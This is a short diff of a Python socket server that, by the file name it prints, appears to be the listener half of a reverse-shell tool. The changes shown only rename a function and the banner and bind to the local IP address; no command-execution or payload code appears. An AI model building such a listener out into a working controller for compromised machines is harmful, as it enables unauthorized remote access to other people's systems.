@@ -12,7 +12,7 @@ def create_socket():
     global port 
     global s 
 
-    host = ""
+    host = socket.gethostbyname(socket.gethostname())
     port = 9999 # port that are not being used a lot
     try:
         s = socket.socket()
@@ -36,7 +36,7 @@ def bind_socket():
 
 
 # establish connection with a client (socket must be listening)
-def accept_socket():
+def accept_connection():
     conn, addr = s.accept()
     print("Connection has been established! | IP ", addr[0], " | Port ", addr[1])
     return conn
@@ -64,11 +64,11 @@ def service_socket(conn):
 
 
 if __name__ == "__main__":
-    print('\n=======\nserver.py\n=======\n')
+    print('\n=======\nrevere_shell_single_server.py\n=======\n')
 
     create_socket()
     bind_socket()
-    conn = accept_socket()
+    conn = accept_connection()
     service_socket(conn)
 
     
